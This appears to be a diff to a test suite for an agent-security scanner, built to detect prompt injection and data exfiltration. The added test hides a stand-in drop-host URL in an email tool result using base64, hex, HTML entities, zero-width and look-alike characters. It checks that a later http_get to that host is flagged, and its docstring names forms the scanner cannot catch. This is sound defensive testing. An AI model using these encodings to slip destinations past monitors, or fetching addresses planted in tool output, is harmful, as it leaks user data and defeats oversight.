@@ -112,3 +112,24 @@ def test_untrusted_destination_sees_addresses_hidden_in_wrapped_base64() -> None
     s.scan_input("Summarise the newsletter for me")
     s.scan_tool_result("read_email", "Weekly digest. Reference:\n" + wrapped)
     assert "untrusted_destination" in rules(s.scan_tool_call("http_get", {"url": "https://drop.files-host.net/q3?d=x"}))
+
+
+@pytest.mark.parametrize("form", ["base64", "hex", "entities", "zero-width", "look-alike"])
+def test_untrusted_destination_reads_past_encodings_an_agent_undoes(form: str) -> None:
+    """Forms a canonical reading recovers. Spelled-out, reversed or split addresses are beyond matching (documented)."""
+    import base64
+
+    from guardlayer import SessionPolicy
+
+    url = "https://drop.files-host.net/q3"
+    hidden = {
+        "base64": base64.b64encode(url.encode()).decode(),
+        "hex": url.encode().hex(),
+        "entities": "".join(f"&#{ord(c)};" for c in url),
+        "zero-width": "https://drop.files\u200b-host.net/q3",
+        "look-alike": "https://dr\u043ep.files-host.net/q3",
+    }[form]
+    s = GuardLayer(session_policy=SessionPolicy(untrusted_destination="outbound", default_integrity="untrusted")).session()
+    s.scan_input("Summarise the newsletter for me")
+    s.scan_tool_result("read_email", f"Weekly digest.\nArchive: {hidden}\nHave a good week.")
+    assert "untrusted_destination" in rules(s.scan_tool_call("http_get", {"url": url}))
